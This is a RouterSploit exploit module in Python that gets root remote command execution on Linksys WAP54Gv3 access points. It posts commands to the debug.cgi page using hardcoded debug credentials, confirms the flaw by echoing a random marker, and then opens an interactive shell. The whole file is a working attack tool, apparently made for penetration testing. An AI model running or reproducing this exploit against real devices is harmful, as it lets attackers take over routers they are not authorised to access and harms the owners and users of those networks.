import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Linksys WAP54Gv3",
        "description": "Module exploits remote command execution in Linksys WAP54Gv3 devices. "
                       "Debug interface allows executing root privileged shell commands is available "
                       "on dedicated web pages on the device.",
        "authors": (
            "Phil Purviance",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://seclists.org/bugtraq/2010/Jun/93",
        ),
        "devices": (
            "Linksys WAP54Gv3",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self)
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        data = {"data1": cmd, "command": "ui_debug"}

        response = self.http_request(
            method="POST",
            path="/debug.cgi",
            data=data,
            auth=("Gemtek", "gemtekswd")
        )
        if response is None:
            return ""

        res = re.findall('<textarea rows=30 cols=100>(.+?)</textarea>', response.text, re.DOTALL)

        if len(res):
            return res[0]

        return ""

    @mute
    def check(self):
        mark = utils.random_text(32)
        cmd = "echo {}".format(mark)

        response = self.execute(cmd)

        if mark in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
